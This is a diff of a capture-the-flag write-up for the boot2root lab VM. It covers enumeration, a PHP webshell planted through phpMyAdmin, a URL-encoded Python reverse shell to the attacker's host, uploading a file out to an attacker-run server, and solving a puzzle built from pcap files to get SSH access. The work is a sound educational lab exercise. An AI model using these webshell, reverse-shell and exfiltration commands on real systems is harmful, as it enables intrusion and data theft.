@@ -1,4 +1,7 @@
-# Enumeration
+# Writeup 1
+
+
+## Enumeration
 
 - `nmap -T4 --top-ports 1000 192.168.56.8`
 ```
@@ -72,6 +75,8 @@ avatar                  [Status: 200, Size: 2099, Words: 265, Lines: 51, Duratio
 disabled                [Status: 200, Size: 2530, Words: 157, Lines: 59, Duration: 39ms]
 ```
 
+## Exploitation
+
 There is a **Probleme login** post on the forum that might be interesting.
 
 
@@ -112,9 +117,11 @@ Bingo again ! We have total control on the database since we are *root*.
 ![](/home/pyves/gitlab/42/42-boot2root/images/root_phpmyadmin.png)
 
 Nothing interesting in the database, but we could try something else. Since we are root we can execute som sql queries,
-and if we are lucky we can upload a webshell on the server by executing `SELECT "<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/webshell.php';`
+and if we are lucky we can upload a webshell on the server by executing `SELECT "<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE '<directory>';`
 
 After trying a lot of path, there is only one path where we got permission to create file, *templates_c*. Let's do it !
+
+- `SELECT "<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/forum/templates_c/webshell.php'`
 
 ![](/home/pyves/gitlab/42/42-boot2root/images/root_pma_upload_webshell.png)
 
@@ -125,8 +132,11 @@ curl -k -s "https://192.168.56.8/forum/templates_c/shell.php?cmd=id"
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
+### Post-Exploitation
+
+
 Great ! We have a webshell. Now we can try to have a reverse shell.\
-For this there is [](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).\
+For this there is [](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
 
 ```
 curl -k -s "https://192.168.56.8/forum/templates_c/shell.php?cmd=which+python"                                                                                                                                           [27/09/23 | 4:07:39]
@@ -140,7 +150,7 @@ the listener with *netcat*.
 
 And on the first terminal we execute the following command:
 
-- `curl -k -s "https://192.168.56.8/forum/templates_c/shell.php?cmd=%70%79%74%68%6f%6e%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%35%36%2e%35%22%2c%34%32%34%32%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%29%3b%27"`
+- `curl -k -s "https://192.168.56.8/forum/templates_c/webshell.php?cmd=%70%79%74%68%6f%6e%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%35%36%2e%35%22%2c%34%32%34%32%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%29%3b%27"`
 
 Which is a reverse shell encoded in url format with *burpsuite*.\
 ![](/home/pyves/gitlab/42/42-boot2root/images/webshell_reverse_shell_payload.png)
@@ -236,7 +246,207 @@ lmezard@BornToSecHackMe:~$ cat /home/lmezard/README
 Complete this little challenge and use the result as password for user 'laurie' to login in ssh
 ```
 
-We are challenged to find valid ssh credentials for user **laurie**.
+We are challenged to find valid ssh credentials for user **laurie**.\
+In the same directory there is a **fun** file, if we use the command `file` on it, it indicates that it is a **tar archive**,
+so we need to extact it. However we do not have rights on the machine to do it there, let's upload the archive on our
+machine.
+
+### UploadServer
+
+In our machine:
+
+1. `pip3 install uploadserver`
+2. `python3 -m uploadserver`
+
+![](/home/pyves/gitlab/42/42-boot2root/images/uploadserver.png)
+
+In the victim's machine:
+3. `curl -X POST 'http://192.168.56.5:8000/upload' -F 'files=@./fun'`
+
+![](/home/pyves/gitlab/42/42-boot2root/images/lmezard_upload_fun.png)
+
+
+Now let's extract the archive.
+
+- `tar -xvf ./fun`
+
+It creates a directory named **ft_fun** full of **.pcap** files. Pcap files are logs of captured traffic over a network,
+we can read thoses files with **wireshark**, but in a first place, we have to sort them.
+
+A simple **cat** on them reveals their content:
+
+```
+//file210}void useless() {
+//file88	printf("Hahahaha Got you!!!\n");
+//file586	printf("Hahahaha Got you!!!\n");
+//file63}void useless() {
+//file667	printf("Hahahaha Got you!!!\n");
+//file395}void useless() {
+//file440}void useless() {
+//file279	printf("Hahahaha Got you!!!\n");
+//file652	printf("Hahahaha Got you!!!\n");
+//file449	printf("Hahahaha Got you!!!\n");
+//file614	printf("Hahahaha Got you!!!\n");
+//file200	printf("Hahahaha Got you!!!\n");
+//file75void useless() {
+//file9	printf("Hahahaha Got you!!!\n");
+//file95	printf("Hahahaha Got you!!!\n");
+```
+
+It seems to ask for a password or something to validates and it's a C code. Maybe there is a main function.
+
+```
+grep -A31 main *
+BJPCP.pcap:int main() {
+BJPCP.pcap-	printf("M");
+BJPCP.pcap-	printf("Y");
+BJPCP.pcap-	printf(" ");
+BJPCP.pcap-	printf("P");
+BJPCP.pcap-	printf("A");
+BJPCP.pcap-	printf("S");
+BJPCP.pcap-	printf("S");
+BJPCP.pcap-	printf("W");
+BJPCP.pcap-	printf("O");
+BJPCP.pcap-	printf("R");
+BJPCP.pcap-	printf("D");
+BJPCP.pcap-	printf(" ");
+BJPCP.pcap-	printf("I");
+BJPCP.pcap-	printf("S");
+BJPCP.pcap-	printf(":");
+BJPCP.pcap-	printf(" ");
+BJPCP.pcap-	printf("%c",getme1());
+BJPCP.pcap-	printf("%c",getme2());
+BJPCP.pcap-	printf("%c",getme3());
+BJPCP.pcap-	printf("%c",getme4());
+BJPCP.pcap-	printf("%c",getme5());
+BJPCP.pcap-	printf("%c",getme6());
+BJPCP.pcap-	printf("%c",getme7());
+BJPCP.pcap-	printf("%c",getme8());
+BJPCP.pcap-	printf("%c",getme9());
+BJPCP.pcap-	printf("%c",getme10());
+BJPCP.pcap-	printf("%c",getme11());
+BJPCP.pcap-	printf("%c",getme12());
+BJPCP.pcap-	printf("\n");
+BJPCP.pcap-	printf("Now SHA-256 it and submit");
+BJPCP.pcap-}
+```
+
+Ok it prints a password by calling some functions, we should **grep** them.
+
+```
+grep -A3 "char getme" *                                                                                                                                                                                                 
+0T16C.pcap:char getme4() {
+0T16C.pcap-
+0T16C.pcap-//file115
+--
+32O0M.pcap:char getme7() {
+32O0M.pcap-
+32O0M.pcap-//file736
+--
+331ZU.pcap:char getme1() {
+331ZU.pcap-
+331ZU.pcap-//file5
+--
+4KAOH.pcap:char getme5() {
+4KAOH.pcap-
+4KAOH.pcap-//file368
+--
+91CD0.pcap:char getme6() {
+91CD0.pcap-
+91CD0.pcap-//file521
+--
+B62N4.pcap:char getme3() {
+B62N4.pcap-
+B62N4.pcap-//file56
+--
+BJPCP.pcap:char getme8() {
+BJPCP.pcap-	return 'w';
+BJPCP.pcap-}
+BJPCP.pcap-/*
+--
+BJPCP.pcap:char getme9() {
+BJPCP.pcap-	return 'n';
+BJPCP.pcap-}
+BJPCP.pcap-/*
+--
+BJPCP.pcap:char getme10() {
+BJPCP.pcap-	return 'a';
+BJPCP.pcap-}
+BJPCP.pcap-/*
+--
+BJPCP.pcap:char getme11() {
+BJPCP.pcap-	return 'g';
+BJPCP.pcap-}
+BJPCP.pcap-/*
+--
+BJPCP.pcap:char getme12()
+BJPCP.pcap-{
+BJPCP.pcap-	return 'e';
+BJPCP.pcap-}
+--
+G7Y8I.pcap:char getme2() {
+G7Y8I.pcap-
+G7Y8I.pcap-//file37
+```
+
+There are comments, that seem indicate a **file number**, if it's an order of the files, we should assemble them
+in the correct order to get the password. We can use a little script in python in the folder **scripts** to do that.
+
+- `python3 ./scripts/pcap_to_c.py`
+
+The script creates a **challenge.c**.
+
+```
+gcc challenge.c -o challenge                                                                                                                                                                                                                                                                                                                                                                                                                                                    [29/09/23 | 10:12:49]
+./challenge                                                                                                                                                                                                                                                                                                                                                                                                                                                                     [29/09/23 | 10:12:51]
+MY PASSWORD IS: Iheartpwnage
+Now SHA-256 it and submit%                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ╭─pyves@ELY0028 ~/gitlab/42/42-boot2root  ‹main*›
+```
+
+Great whe have the password, we just have to encode it with **sha256** and **ssh** as **laurie**.
+
+```
+echo -n 'Iheartpwnage' | sha256sum
+330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
+╭─pyves@ELY0028 ~/gitlab/42/42-boot2root  ‹main*›
+╰─➤  ssh laurie@192.168.56.8                                                                                                                                                                                                                                                                                                                                                                                                                                                         [29/09/23 | 10:16:26]
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+laurie@192.168.56.8's password:
+laurie@BornToSecHackMe:~$ id
+id=1003(laurie) gid=1003(laurie) groups=1003(laurie)1
+```
+
+The command `ls` in the home directory of **laurie** reveals a **README** with instructions to get the password for the
+user **thor**:
+
+```
+laurie@BornToSecHackMe:~$ ls
+bomb  README
+laurie@BornToSecHackMe:~$ cat README
+Diffuse this bomb!
+When you have all the password use it as "thor" user with ssh.
+
+HINT:
+P
+ 2
+ b
+
+o
+4
+
+NO SPACE IN THE PASSWORD (password is case sensitive).
+```
+
+
+
+
 
 
 
